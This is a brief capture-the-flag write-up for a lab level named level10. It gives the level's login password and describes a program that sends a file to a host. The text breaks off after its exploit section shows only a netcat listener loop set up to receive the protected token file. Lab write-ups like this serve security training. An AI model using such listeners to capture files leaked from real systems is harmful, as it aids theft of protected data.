## level10

```bash
$ su level10 s5cAJpM8ev6XHw998pRWG728z
```

### Vulnerability Assessment

```bash
$ ./level10 
./level10 file host
	sends file to host if you have access to it
```

The directory contains two files: an executable named `level10` and a file named `token`. The contents of the `token` is not readable because of the permissions.



### Exploit

```bash
$ while true; do nc -l 192.168.56.103 6969; done
```
